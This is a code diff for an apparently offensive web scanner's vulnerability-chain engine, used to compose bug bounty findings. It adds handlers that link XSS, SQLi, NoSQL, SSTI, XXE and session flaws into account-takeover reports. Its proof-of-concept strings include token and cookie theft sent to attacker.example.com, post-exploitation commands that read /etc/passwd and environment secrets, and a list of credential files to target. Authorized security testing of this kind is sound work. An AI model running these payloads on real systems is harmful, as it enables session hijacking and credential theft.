@@ -35,6 +35,7 @@ from urllib.parse import urljoin, urlparse
 import httpx
 
 from utils.logger import get_logger
+from utils.shared_findings_store import SharedFindingsStore, VulnType
 
 logger = get_logger(__name__)
 
@@ -116,6 +117,14 @@ class ChainTrigger(Enum):
     JWT_WEAKNESS = auto()           # JWT vulnerabilities
     CORS_MISCONFIGURATION = auto()  # CORS issues enabling attacks
     CACHE_POISONING = auto()        # Cache poisoning opportunities
+    # ═══════════════════════════════════════════════════════════════════
+    # CROSS-MODULE TRIGGERS (for causal chain composition)
+    # ═══════════════════════════════════════════════════════════════════
+    XSS_CONFIRMED = auto()          # XSS (reflected/stored) confirmed
+    DOM_XSS_CONFIRMED = auto()      # DOM XSS confirmed (browser-based)
+    NOSQL_INJECTION = auto()        # NoSQL injection confirmed
+    SESSION_WEAKNESS = auto()       # Session/token abuse confirmed
+    BUSINESS_LOGIC = auto()         # Business logic flaw confirmed
     # SPECULATIVE TRIGGERS (based on technology, not confirmed vulns)
     SPECULATIVE_AWS = auto()        # AWS detected, suggest attack paths
     SPECULATIVE_API = auto()        # API detected, suggest attack paths
@@ -218,6 +227,31 @@ class VulnerabilityChainEngine:
         # Template injection
         "ssti": ChainTrigger.SSTI_CONFIRMED,
         "template_injection": ChainTrigger.SSTI_CONFIRMED,
+
+        # XSS (cross-module chain triggers)
+        "xss": ChainTrigger.XSS_CONFIRMED,
+        "cross_site_scripting": ChainTrigger.XSS_CONFIRMED,
+        "reflected_xss": ChainTrigger.XSS_CONFIRMED,
+        "stored_xss": ChainTrigger.XSS_CONFIRMED,
+        "template_injection_xss": ChainTrigger.XSS_CONFIRMED,
+        "dom_xss": ChainTrigger.DOM_XSS_CONFIRMED,
+        "dom_based_xss": ChainTrigger.DOM_XSS_CONFIRMED,
+
+        # NoSQL injection
+        "nosql_injection": ChainTrigger.NOSQL_INJECTION,
+        "nosqli": ChainTrigger.NOSQL_INJECTION,
+        "mongodb_injection": ChainTrigger.NOSQL_INJECTION,
+
+        # Session/Token abuse
+        "session_abuse": ChainTrigger.SESSION_WEAKNESS,
+        "jwt_replay": ChainTrigger.SESSION_WEAKNESS,
+        "session_fixation": ChainTrigger.SESSION_FIXATION,
+        "token_not_invalidated": ChainTrigger.SESSION_WEAKNESS,
+
+        # Business logic
+        "business_logic": ChainTrigger.BUSINESS_LOGIC,
+        "price_manipulation": ChainTrigger.BUSINESS_LOGIC,
+        "workflow_bypass": ChainTrigger.BUSINESS_LOGIC,
 
         # Information disclosure
         "information_disclosure": ChainTrigger.INFO_DISCLOSURE,
@@ -495,6 +529,81 @@ class VulnerabilityChainEngine:
             action="ssti_rce",
             priority=ChainPriority.CRITICAL,
             description="SSTI → Template engine RCE",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════
+        # CROSS-MODULE CAUSAL CHAINS (real composition via SharedFindingsStore)
+        # These query findings from OTHER modules to build attack chains
+        # ════════════════════════════════════════════════════════════════
+
+        # XSS → Token/Session chains
+        ChainRule(
+            trigger=ChainTrigger.XSS_CONFIRMED,
+            action="xss_token_theft_chain",
+            priority=ChainPriority.CRITICAL,
+            description="XSS → Token theft → Account takeover (cross-module)",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.DOM_XSS_CONFIRMED,
+            action="xss_token_theft_chain",
+            priority=ChainPriority.CRITICAL,
+            description="DOM XSS → Token theft → Account takeover (cross-module)",
+            condition=None,
+        ),
+
+        # SQLi → Credential extraction → Auth bypass chain
+        ChainRule(
+            trigger=ChainTrigger.SQLI_CONFIRMED,
+            action="sqli_credential_auth_chain",
+            priority=ChainPriority.CRITICAL,
+            description="SQLi extracted credentials → Login as admin (cross-module)",
+            condition=None,
+        ),
+
+        # NoSQL → Data extraction → Auth bypass chain
+        ChainRule(
+            trigger=ChainTrigger.NOSQL_INJECTION,
+            action="nosql_auth_bypass_chain",
+            priority=ChainPriority.CRITICAL,
+            description="NoSQL injection → Data extraction → Auth bypass (cross-module)",
+            condition=None,
+        ),
+
+        # Session weakness + XSS → Persistent ATO
+        ChainRule(
+            trigger=ChainTrigger.SESSION_WEAKNESS,
+            action="session_xss_ato_chain",
+            priority=ChainPriority.CRITICAL,
+            description="Session weakness + XSS → Persistent account takeover (cross-module)",
+            condition=None,
+        ),
+
+        # Business logic + IDOR → Financial fraud
+        ChainRule(
+            trigger=ChainTrigger.BUSINESS_LOGIC,
+            action="business_idor_fraud_chain",
+            priority=ChainPriority.HIGH,
+            description="Business logic + IDOR → Financial fraud chain (cross-module)",
+            condition=None,
+        ),
+
+        # SSTI with RCE → Post-exploitation chain
+        ChainRule(
+            trigger=ChainTrigger.SSTI_CONFIRMED,
+            action="ssti_post_exploit_chain",
+            priority=ChainPriority.CRITICAL,
+            description="SSTI RCE → Credential theft + lateral movement (cross-module)",
+            condition=None,
+        ),
+
+        # XXE → Credential extraction from files → Auth chain
+        ChainRule(
+            trigger=ChainTrigger.XXE_CONFIRMED,
+            action="xxe_credential_chain",
+            priority=ChainPriority.CRITICAL,
+            description="XXE file read → Credential extraction → Auth test (cross-module)",
             condition=None,
         ),
 
@@ -820,6 +929,17 @@ class VulnerabilityChainEngine:
             "speculative_api_attack_paths": self._speculative_api_attack_paths,
 
             # ════════════════════════════════════════════════════════════════
+            # CROSS-MODULE CAUSAL CHAIN HANDLERS
+            # ════════════════════════════════════════════════════════════════
+            "xss_token_theft_chain": self._xss_token_theft_chain,
+            "sqli_credential_auth_chain": self._sqli_credential_auth_chain,
+            "nosql_auth_bypass_chain": self._nosql_auth_bypass_chain,
+            "session_xss_ato_chain": self._session_xss_ato_chain,
+            "business_idor_fraud_chain": self._business_idor_fraud_chain,
+            "ssti_post_exploit_chain": self._ssti_post_exploit_chain,
+            "xxe_credential_chain": self._xxe_credential_chain,
+
+            # ════════════════════════════════════════════════════════════════
             # COMMUNICATIONS API CHAIN HANDLERS (Twilio, SendGrid, Authy)
             # ════════════════════════════════════════════════════════════════
             "comms_phone_enumeration_chain": self._comms_phone_enumeration_chain,
@@ -901,11 +1021,14 @@ class VulnerabilityChainEngine:
         return self.VULN_TYPE_MAPPING.get(vuln_type)
 
     def _update_context_from_finding(self, finding: Dict[str, Any]) -> None:
-        """Extract context information from finding."""
+        """Extract context information from finding, including rich extraction data."""
         metadata = finding.get("metadata", {})
+        evidence_str = str(finding.get("evidence", "")).lower()
 
-        # Extract database type from error messages
-        if "error" in str(finding.get("evidence", "")).lower():
+        # Extract database type from error messages or metadata
+        if metadata.get("db_type"):
+            self.context["db_type"] = metadata["db_type"]
+        elif "error" in evidence_str:
             evidence = str(finding.get("evidence", ""))
             if "mysql" in evidence.lower():
                 self.context["db_type"] = "mysql"
@@ -929,6 +1052,70 @@ class VulnerabilityChainEngine:
         # Extract any disclosed software versions
         if metadata.get("version"):
             self.context["disclosed_software"] = metadata["version"]
+
+        # ═══════════════════════════════════════════════════════════════════
+        # RICH METADATA EXTRACTION (from enhanced scanner modules)
+        # ═══════════════════════════════════════════════════════════════════
+
+        # SQLi extracted data (tables, credentials, DB version)
+        extracted_data = metadata.get("extracted_data", {})
+        if extracted_data:
+            self.context["sqli_extracted_data"] = extracted_data
+            # Check for extracted credentials
+            if extracted_data.get("sample_data"):
+                for table, rows in extracted_data["sample_data"].items():
+                    if any(col in str(rows).lower() for col in ["password", "passwd", "hash", "secret", "token"]):
+                        self.context["has_extracted_credentials"] = True
+                        self.context["credential_table"] = table
+                        self.context["credential_data"] = rows
+                        break
+
+        # NoSQL extracted data
+        nosql_data = metadata.get("nosql_extracted_data", extracted_data)
+        if nosql_data and finding.get("type", "").lower() in ("nosql_injection", "nosqli"):
+            self.context["nosql_extracted_data"] = nosql_data
+
+        # XXE file content
+        file_content = metadata.get("file_content", "")
+        if file_content:
+            self.context["xxe_file_content"] = file_content
+            # Check for credentials in extracted files
+            content_lower = file_content.lower()
+            if any(kw in content_lower for kw in ["password", "secret", "api_key", "token", "aws_"]):
+                self.context["xxe_has_credentials"] = True
+                self.context["xxe_credential_content"] = file_content
+
+        # SSTI RCE output
+        rce_output = metadata.get("rce_output", "")
+        if rce_output:
+            self.context["ssti_rce_output"] = rce_output
+            self.context["ssti_has_rce"] = metadata.get("rce_confirmed", False)
+
+        # XSS endpoint for cross-referencing
+        vuln_type = finding.get("type", "").lower()
+        if vuln_type in ("xss", "cross_site_scripting", "dom_xss", "reflected_xss", "stored_xss"):
+            xss_endpoints = self.context.get("xss_endpoints", [])
+            xss_endpoints.append({
+                "url": finding.get("matched_at", ""),
+                "type": vuln_type,
+                "payload": metadata.get("poc", {}).get("working_payload", ""),
+            })
+            self.context["xss_endpoints"] = xss_endpoints
+
+        # Session/JWT weakness data
+        if vuln_type in ("session_abuse", "jwt_replay", "token_not_invalidated"):
+            self.context["session_weakness_type"] = finding.get("name", vuln_type)
+            self.context["has_session_weakness"] = True
+
+        # Business logic data
+        if vuln_type == "business_logic":
+            biz_findings = self.context.get("business_logic_findings", [])
+            biz_findings.append({
+                "name": finding.get("name", ""),
+                "endpoint": finding.get("matched_at", ""),
+                "severity": finding.get("severity", ""),
+            })
+            self.context["business_logic_findings"] = biz_findings
 
     def _get_applicable_rules(self, trigger: ChainTrigger) -> List[ChainRule]:
         """Get rules applicable for a trigger given current context."""
@@ -2327,6 +2514,596 @@ fetch('https://vulnerable-api.com/user/data', {
                 "bounty_potential": "$10k-$50k (critical auth bypass)",
             },
         }]
+
+    # ════════════════════════════════════════════════════════════════════════
+    # CROSS-MODULE CAUSAL CHAIN HANDLERS
+    # These query SharedFindingsStore for findings from OTHER modules
+    # and compose them into documented, provable attack chains
+    # ════════════════════════════════════════════════════════════════════════
+
+    def _get_store(self) -> SharedFindingsStore:
+        """Get SharedFindingsStore instance."""
+        return SharedFindingsStore.get_instance()
+
+    async def _xss_token_theft_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        XSS → Token Theft → Account Takeover chain.
+
+        Queries SharedFindingsStore for JWT/session weaknesses to compose:
+        - XSS + JWT in localStorage → token theft
+        - XSS + cookie without HttpOnly → session hijack
+        - XSS + JWT not invalidated after logout → persistent ATO
+        """
+        findings = []
+        store = self._get_store()
+        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
+        xss_type = finding.get("type", "xss")
+        xss_payload = finding.get("metadata", {}).get("poc", {}).get("working_payload", "<script>alert(1)</script>")
+
+        # Check for JWT/session findings from other modules
+        jwt_findings = store.get_findings_by_type(VulnType.AUTH_BYPASS)
+        session_findings = [f for f in store.get_all_findings() if "session" in f.type.lower() or "jwt" in f.type.lower()]
+
+        # Check for cookie security findings (no HttpOnly)
+        cookie_findings = [f for f in store.get_all_findings() if "cookie" in f.type.lower()]
+        no_httponly = any("httponly" in str(f.metadata).lower() for f in cookie_findings)
+
+        # Build chain evidence
+        chain_steps = [
+            f"1. XSS confirmed at {endpoint} via {xss_type}",
+            f"   Payload: {xss_payload[:100]}",
+        ]
+
+        # Token theft via localStorage
+        chain_steps.append("2. Check token storage: document.cookie / localStorage.getItem('token')")
+
+        if session_findings:
+            session_info = session_findings[0]
+            chain_steps.append(
+                f"3. Session weakness found: {session_info.type} at {session_info.endpoint}"
+            )
+            chain_steps.append("4. Stolen token remains valid (no server-side invalidation)")
+            chain_steps.append("5. Attacker uses stolen token → Full Account Takeover")
+
+            findings.append({
+                "type": "xss_token_ato_chain",
+                "name": "XSS → Token Theft → Account Takeover (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 90,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Cross-Site Scripting at {endpoint} can steal authentication tokens. "
+                    f"Combined with {session_info.type} ({session_info.endpoint}), "
+                    "the stolen token remains valid indefinitely, enabling persistent account takeover."
+                ),
+                "metadata": {
+                    "chain_type": "xss_to_ato",
+                    "is_cross_module": True,
+                    "chain_components": [
+                        {"module": "xss", "finding": xss_type, "endpoint": endpoint},
+                        {"module": "session", "finding": session_info.type, "endpoint": session_info.endpoint},
+                    ],
+                    "chain_steps": chain_steps,
+                    "poc": {
+                        "xss_payload": xss_payload,
+                        "token_theft_js": "fetch('https://attacker.example.com/steal?t='+localStorage.getItem('token'))",
+                        "impact": "Full account takeover - stolen token valid after logout",
+                    },
+                },
+            })
+        elif no_httponly:
+            chain_steps.append("3. Cookie missing HttpOnly flag → accessible via document.cookie")
+            chain_steps.append("4. XSS steals session cookie → attacker replays in new browser")
+
+            findings.append({
+                "type": "xss_cookie_theft_chain",
+                "name": "XSS → Cookie Theft → Session Hijack (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 85,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Cross-Site Scripting at {endpoint} can steal session cookies "
+                    "(missing HttpOnly flag). Attacker can hijack active sessions."
+                ),
+                "metadata": {
+                    "chain_type": "xss_to_session_hijack",
+                    "is_cross_module": True,
+                    "chain_steps": chain_steps,
+                    "poc": {
+                        "xss_payload": xss_payload,
+                        "cookie_theft_js": "new Image().src='https://attacker.example.com/steal?c='+document.cookie",
+                    },
+                },
+            })
+        else:
+            # Standalone XSS chain suggestion (no complementary findings yet)
+            findings.append({
+                "type": "xss_potential_ato_chain",
+                "name": "XSS → Potential Token Theft (Chain Candidate)",
+                "severity": "HIGH",
+                "confidence": 75,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"XSS at {endpoint} could enable token/cookie theft. "
+                    "Impact depends on token storage mechanism and HttpOnly flags."
+                ),
+                "metadata": {
+                    "chain_type": "xss_potential_ato",
+                    "is_cross_module": False,
+                    "poc": {
+                        "xss_payload": xss_payload,
+                        "manual_check": "Verify if tokens are in localStorage or cookies without HttpOnly",
+                    },
+                },
+            })
+
+        return findings
+
+    async def _sqli_credential_auth_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        SQLi → Credential Extraction → Admin Login chain.
+
+        Uses extracted_data from enhanced SQLi scanner to prove credential theft
+        and link to authentication endpoints.
+        """
+        findings = []
+        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
+        extracted = context.get("sqli_extracted_data", {})
+        has_creds = context.get("has_extracted_credentials", False)
+
+        if not extracted:
+            # Check finding metadata directly
+            extracted = finding.get("metadata", {}).get("extracted_data", {})
+            if extracted and extracted.get("sample_data"):
+                for table, rows in extracted["sample_data"].items():
+                    if any(col in str(rows).lower() for col in ["password", "passwd", "hash", "token"]):
+                        has_creds = True
+                        break
+
+        if has_creds:
+            cred_table = context.get("credential_table", "users")
+            cred_data = context.get("credential_data", {})
+            db_version = extracted.get("db_version", "unknown")
+            tables = extracted.get("tables", [])
+
+            findings.append({
+                "type": "sqli_credential_chain",
+                "name": "SQLi → Credential Extraction → Admin Authentication (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 95,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"SQL Injection at {endpoint} successfully extracted credentials "
+                    f"from '{cred_table}' table (DB: {db_version}). "
+                    "Extracted password hashes can be cracked for admin access."
+                ),
+                "metadata": {
+                    "chain_type": "sqli_to_admin",
+                    "is_cross_module": True,
+                    "chain_steps": [
+                        f"1. SQLi confirmed at {endpoint}",
+                        f"2. Database identified: {db_version}",
+                        f"3. Tables enumerated: {', '.join(tables[:5]) if tables else 'N/A'}",
+                        f"4. Credentials extracted from '{cred_table}'",
+                        "5. Password hashes cracked → admin login",
+                    ],
+                    "extracted_evidence": {
+                        "db_version": db_version,
+                        "table_count": len(tables),
+                        "credential_table": cred_table,
+                        "sample_data_preview": str(cred_data)[:200] if cred_data else "N/A",
+                    },
+                    "poc": {
+                        "extraction_endpoint": endpoint,
+                        "next_steps": [
+                            "Crack extracted password hashes (hashcat/john)",
+                            "Login to admin panel with cracked credentials",
+                            "Verify privilege escalation",
+                        ],
+                    },
+                },
+            })
+        elif extracted:
+            # Data extracted but no credentials found
+            db_version = extracted.get("db_version", "unknown")
+            tables = extracted.get("tables", [])
+
+            findings.append({
+                "type": "sqli_data_breach_chain",
+                "name": f"SQLi → Database Breach ({len(tables)} tables extracted)",
+                "severity": "HIGH",
+                "confidence": 90,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"SQL Injection at {endpoint} extracted {len(tables)} database tables. "
+                    f"Database: {db_version}. Sensitive data exposure confirmed."
+                ),
+                "metadata": {
+                    "chain_type": "sqli_data_breach",
+                    "is_cross_module": True,
+                    "extracted_evidence": {
+                        "db_version": db_version,
+                        "tables": tables[:20],
+                        "sample_data": {k: str(v)[:100] for k, v in extracted.get("sample_data", {}).items()},
+                    },
+                },
+            })
+
+        return findings
+
+    async def _nosql_auth_bypass_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        NoSQL Injection → Data Extraction → Auth Bypass chain.
+
+        Uses extracted data from NoSQL $regex brute-force to prove credential theft.
+        """
+        findings = []
+        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
+        nosql_data = context.get("nosql_extracted_data", {})
+
+        if not nosql_data:
+            nosql_data = finding.get("metadata", {}).get("extracted_data", {})
+
+        if nosql_data:
+            has_email = any("email" in k.lower() for k in nosql_data)
+            has_password = any("password" in k.lower() or "hash" in k.lower() for k in nosql_data)
+
+            if has_email or has_password:
+                findings.append({
+                    "type": "nosql_credential_chain",
+                    "name": "NoSQL Injection → Credential Extraction → Auth Bypass (Proven Chain)",
+                    "severity": "CRITICAL",
+                    "confidence": 90,
+                    "matched_at": endpoint,
+                    "url": endpoint,
+                    "description": (
+                        f"NoSQL Injection at {endpoint} extracted user credentials via "
+                        "$regex brute-force. Extracted fields can be used for authentication bypass."
+                    ),
+                    "metadata": {
+                        "chain_type": "nosql_to_auth_bypass",
+                        "is_cross_module": True,
+                        "chain_steps": [
+                            f"1. NoSQL Injection confirmed at {endpoint}",
+                            "2. $regex brute-force extracted user data",
+                            f"3. Fields extracted: {', '.join(nosql_data.keys())}",
+                            "4. Use extracted credentials for authentication bypass",
+                        ],
+                        "extracted_fields": list(nosql_data.keys()),
+                        "poc": {
+                            "technique": "$regex character-by-character brute-force",
+                            "impact": "Full credential extraction and authentication bypass",
+                        },
+                    },
+                })
+        else:
+            # NoSQL injection confirmed but no data extracted yet
+            findings.append({
+                "type": "nosql_extraction_chain",
+                "name": "NoSQL Injection → Data Extraction Ready",
+                "severity": "HIGH",
+                "confidence": 80,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"NoSQL Injection at {endpoint} confirmed. "
+                    "$regex brute-force can extract user data from MongoDB collections."
+                ),
+                "metadata": {
+                    "chain_type": "nosql_extraction",
+                    "poc": {
+                        "technique": '$regex brute-force: {"email": {"$regex": "^a"}}',
+                        "targets": ["email", "password", "username", "role"],
+                    },
+                },
+            })
+
+        return findings
+
+    async def _session_xss_ato_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Session Weakness + XSS → Persistent Account Takeover chain.
+
+        Queries SharedFindingsStore for XSS findings to compose with session weakness.
+        """
+        findings = []
+        store = self._get_store()
+        endpoint = finding.get("matched_at", "")
+        session_type = finding.get("name", finding.get("type", "session_abuse"))
+
+        # Query store for XSS findings
+        xss_findings = store.get_findings_by_type(VulnType.XSS)
+        xss_endpoints = context.get("xss_endpoints", [])
+
+        if xss_findings or xss_endpoints:
+            xss_info = xss_findings[0] if xss_findings else None
+            xss_url = xss_info.endpoint if xss_info else (xss_endpoints[0]["url"] if xss_endpoints else "")
+
+            findings.append({
+                "type": "session_xss_ato_chain",
+                "name": "Session Weakness + XSS → Persistent Account Takeover (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 90,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Session weakness ({session_type}) combined with XSS at {xss_url} "
+                    "enables persistent account takeover. Attacker can steal tokens via XSS, "
+                    "and tokens remain valid indefinitely due to missing server-side invalidation."
+                ),
+                "metadata": {
+                    "chain_type": "session_plus_xss_ato",
+                    "is_cross_module": True,
+                    "chain_components": [
+                        {"module": "session_abuse", "finding": session_type, "endpoint": endpoint},
+                        {"module": "xss", "finding": "xss", "endpoint": xss_url},
+                    ],
+                    "chain_steps": [
+                        f"1. Session weakness: {session_type} at {endpoint}",
+                        f"2. XSS confirmed at {xss_url}",
+                        "3. Attacker injects XSS payload → steals JWT/session token",
+                        "4. Token not invalidated → persistent access even after password change",
+                        "5. Result: Persistent Account Takeover",
+                    ],
+                    "impact": "Attacker maintains access even if victim changes password or logs out",
+                },
+            })
+        else:
+            # Session weakness without XSS — still report the chain potential
+            findings.append({
+                "type": "session_chain_candidate",
+                "name": f"Session Weakness → ATO Chain Candidate ({session_type})",
+                "severity": "HIGH",
+                "confidence": 75,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Session weakness ({session_type}) at {endpoint}. "
+                    "If combined with XSS or token theft vector, enables persistent ATO."
+                ),
+                "metadata": {
+                    "chain_type": "session_chain_candidate",
+                    "needs": ["XSS or token theft vector"],
+                },
+            })
+
+        return findings
+
+    async def _business_idor_fraud_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Business Logic + IDOR → Financial Fraud chain.
+
+        Queries SharedFindingsStore for IDOR findings to compose with business logic flaws.
+        """
+        findings = []
+        store = self._get_store()
+        endpoint = finding.get("matched_at", "")
+        biz_name = finding.get("name", "business logic flaw")
+
+        # Query for IDOR findings
+        idor_findings = store.get_findings_by_type(VulnType.IDOR)
+        # Also check for auth bypass findings
+        auth_findings = store.get_findings_by_type(VulnType.AUTH_BYPASS)
+
+        if idor_findings:
+            idor_info = idor_findings[0]
+            findings.append({
+                "type": "business_idor_fraud_chain",
+                "name": "Business Logic + IDOR → Multi-Account Financial Fraud (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 85,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Business logic flaw ({biz_name}) at {endpoint} combined with "
+                    f"IDOR at {idor_info.endpoint} enables multi-account financial fraud. "
+                    "Attacker can exploit pricing/quantity manipulation across multiple accounts."
+                ),
+                "metadata": {
+                    "chain_type": "business_plus_idor_fraud",
+                    "is_cross_module": True,
+                    "chain_components": [
+                        {"module": "business_logic", "finding": biz_name, "endpoint": endpoint},
+                        {"module": "idor", "finding": idor_info.type, "endpoint": idor_info.endpoint},
+                    ],
+                    "chain_steps": [
+                        f"1. Business logic: {biz_name} at {endpoint}",
+                        f"2. IDOR: {idor_info.type} at {idor_info.endpoint}",
+                        "3. Attacker manipulates prices/quantities via business logic flaw",
+                        "4. IDOR allows repeating across multiple user accounts",
+                        "5. Result: Scaled financial fraud",
+                    ],
+                },
+            })
+
+        if auth_findings:
+            auth_info = auth_findings[0]
+            findings.append({
+                "type": "business_auth_fraud_chain",
+                "name": "Business Logic + Auth Bypass → Unauthorized Transaction (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 85,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Business logic flaw ({biz_name}) combined with auth bypass "
+                    f"({auth_info.type}) enables unauthorized financial transactions."
+                ),
+                "metadata": {
+                    "chain_type": "business_plus_auth",
+                    "is_cross_module": True,
+                    "chain_components": [
+                        {"module": "business_logic", "finding": biz_name, "endpoint": endpoint},
+                        {"module": "auth", "finding": auth_info.type, "endpoint": auth_info.endpoint},
+                    ],
+                },
+            })
+
+        if not idor_findings and not auth_findings:
+            # Standalone business logic — still valuable
+            findings.append({
+                "type": "business_fraud_chain",
+                "name": f"Business Logic Flaw → Financial Impact ({biz_name})",
+                "severity": "HIGH",
+                "confidence": 80,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Business logic flaw ({biz_name}) at {endpoint} enables financial manipulation."
+                ),
+                "metadata": {
+                    "chain_type": "business_fraud",
+                    "escalation_paths": [
+                        "Combine with IDOR for multi-account exploitation",
+                        "Combine with auth bypass for unauthorized transactions",
+                    ],
+                },
+            })
+
+        return findings
+
+    async def _ssti_post_exploit_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        SSTI with RCE → Post-Exploitation chain.
+
+        Uses captured RCE output to prove credential theft and further exploitation.
+        """
+        findings = []
+        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
+        rce_output = context.get("ssti_rce_output", "")
+        has_rce = context.get("ssti_has_rce", False)
+
+        if not rce_output:
+            rce_output = finding.get("metadata", {}).get("rce_output", "")
+            has_rce = finding.get("metadata", {}).get("rce_confirmed", False)
+
+        if has_rce and rce_output:
+            findings.append({
+                "type": "ssti_rce_post_exploit_chain",
+                "name": "SSTI → RCE → Server Compromise (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 95,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"Server-Side Template Injection at {endpoint} achieves Remote Code Execution. "
+                    f"RCE output captured: {rce_output[:100]}. "
+                    "Full server compromise possible."
+                ),
+                "metadata": {
+                    "chain_type": "ssti_to_server_compromise",
+                    "is_cross_module": True,
+                    "rce_output": rce_output,
+                    "chain_steps": [
+                        f"1. SSTI confirmed at {endpoint}",
+                        "2. Template engine sandbox escaped → RCE achieved",
+                        f"3. Command output: {rce_output[:200]}",
+                        "4. Post-exploitation: read /etc/passwd, env vars, DB credentials",
+                        "5. Lateral movement: use extracted credentials for other services",
+                    ],
+                    "post_exploit_commands": [
+                        "cat /etc/passwd",
+                        "env | grep -i password",
+                        "cat /proc/self/environ",
+                        "find / -name '*.env' 2>/dev/null",
+                        "cat /var/www/*/.env 2>/dev/null",
+                    ],
+                },
+            })
+        elif has_rce:
+            findings.append({
+                "type": "ssti_rce_chain",
+                "name": "SSTI → RCE Confirmed (Server Compromise Ready)",
+                "severity": "CRITICAL",
+                "confidence": 90,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"SSTI at {endpoint} achieves RCE. Post-exploitation possible."
+                ),
+                "metadata": {
+                    "chain_type": "ssti_rce",
+                    "rce_confirmed": True,
+                },
+            })
+
+        return findings
+
+    async def _xxe_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        XXE → File Read → Credential Extraction chain.
+
+        Uses captured file content to identify credentials and chain to auth.
+        """
+        findings = []
+        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
+        file_content = context.get("xxe_file_content", "")
+        has_creds = context.get("xxe_has_credentials", False)
+
+        if not file_content:
+            file_content = finding.get("metadata", {}).get("file_content", "")
+
+        if file_content and has_creds:
+            # Extract credential indicators
+            cred_indicators = []
+            for line in file_content.split("\n"):
+                line_lower = line.lower()
+                if any(kw in line_lower for kw in ["password", "secret", "api_key", "token", "aws_", "db_"]):
+                    cred_indicators.append(line.strip()[:100])
+
+            findings.append({
+                "type": "xxe_credential_chain",
+                "name": "XXE → File Read → Credential Extraction (Proven Chain)",
+                "severity": "CRITICAL",
+                "confidence": 95,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"XXE at {endpoint} extracted file content containing credentials. "
+                    f"Found {len(cred_indicators)} credential indicators."
+                ),
+                "metadata": {
+                    "chain_type": "xxe_to_credential_theft",
+                    "is_cross_module": True,
+                    "chain_steps": [
+                        f"1. XXE confirmed at {endpoint}",
+                        "2. File disclosure exploited → sensitive file content extracted",
+                        f"3. {len(cred_indicators)} credential patterns found in file",
+                        "4. Use extracted credentials for authentication/lateral movement",
+                    ],
+                    "credential_indicators": cred_indicators[:10],
+                    "file_content_preview": file_content[:300],
+                },
+            })
+        elif file_content:
+            # File content extracted but no obvious credentials
+            findings.append({
+                "type": "xxe_data_breach_chain",
+                "name": "XXE → Sensitive File Disclosure (Data Breach)",
+                "severity": "HIGH",
+                "confidence": 85,
+                "matched_at": endpoint,
+                "url": endpoint,
+                "description": (
+                    f"XXE at {endpoint} extracted sensitive file content. "
+                    "Further exploitation may reveal credentials."
+                ),
+                "metadata": {
+                    "chain_type": "xxe_data_breach",
+                    "file_content_preview": file_content[:200],
+                    "next_targets": [
+                        "/etc/shadow", "~/.ssh/id_rsa", "/var/www/.env",
+                        "/proc/self/environ", "~/.aws/credentials",
+                    ],
+                },
+            })
+
+        return findings
 
     async def _speculative_comms_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
         """
